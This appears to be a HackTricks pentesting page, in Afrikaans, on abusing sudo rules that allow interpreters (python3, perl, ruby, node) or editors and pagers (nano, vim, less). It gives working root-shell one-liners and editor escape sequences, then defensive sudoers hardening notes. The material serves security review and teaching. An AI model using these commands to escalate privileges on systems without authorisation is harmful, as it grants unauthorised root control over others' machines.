# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo-toegelate interpreters

As `sudo -l` ’n gebruiker toelaat om ’n interpreter as root uit te voer, behandel dit as direkte code execution. Interpreters is ontwerp om arbitrêre code uit te voer, dus is ’n reël wat `python3`, `perl`, `ruby`, `lua`, `node` of soortgelyke binaries toelaat, gewoonlik gelykstaande aan root command execution, tensy die argumente streng beperk en gevalideer word.

Algemene review-vloei:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Ander voorbeelde van interpreters:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Die presiese pad is belangrik. Indien die sudo-reël `/usr/bin/python3` toelaat, gebruik daardie presiese pad tydens validering:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors wat deur Sudo toegelaat word

As `sudo -l` ’n gebruiker toelaat om ’n interaktiewe editor as root uit te voer, behandel dit as ’n command-execution-oppervlak, nie as ’n onskadelike lêerwysigingstoestemming nie. Editors kan dikwels shell commands uitvoer, arbitrêre lêers lees, arbitrêre lêers skryf, of eksterne helpers vanuit die editor aanroep.

Algemene hersieningsvloei:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano-opdraguitvoering

Wanneer `nano` deur sudo toegelaat word, kan opdraguitvoering vanaf die redigeerder-koppelvlak moontlik wees:
```text
Ctrl+R
Ctrl+X
```
Verskaf dan 'n opdrag soos:
```bash
id
/bin/sh
```
Op sommige terminals moet 'n interactive shell moontlik standaardstrome herlei:
```bash
reset; /bin/sh 1>&0 2>&0
```
Die presiese sleutelvolgorde kan volgens die nano-weergawe en bouopsies verskil, maar die sekuriteitskwessie bly dieselfde: die editor loop as root en kan eksterne bevele uitvoer.

### Ander algemene editor-ontsnappings

Vim-style editors stel gewoonlik beveluitvoering via `:!` beskikbaar:
```text
:!/bin/sh
```
Pagers soos `less` kan ook shell execution blootstel:
```text
!/bin/sh
```
## Verdedigingsnotas

- Vermy die toekenning van interpreters of interaktiewe editors deur sudo.
- Verkies vaste, root-owned wrappers wat een beperkte administratiewe handeling uitvoer.
- Indien ’n interpreter onvermydelik is, beperk die presiese script-pad en verhoed gebruikerbeheerde argumente, skryfbare imports, `PYTHONPATH` en onveilige omgewingsbewaring.
- Indien lêerredigering vereis word, beperk die presiese lêerpad en oorweeg `sudoedit` met gepatchte sudo-weergawes en streng omgewingshantering.
- Hersien `SETENV`, `env_keep`, skryfbare werkgidse, skryfbare module/import-paaie, `NOEXEC`, `use_pty` en logging, maar moenie dit as ’n volledige sandbox beskou nie.
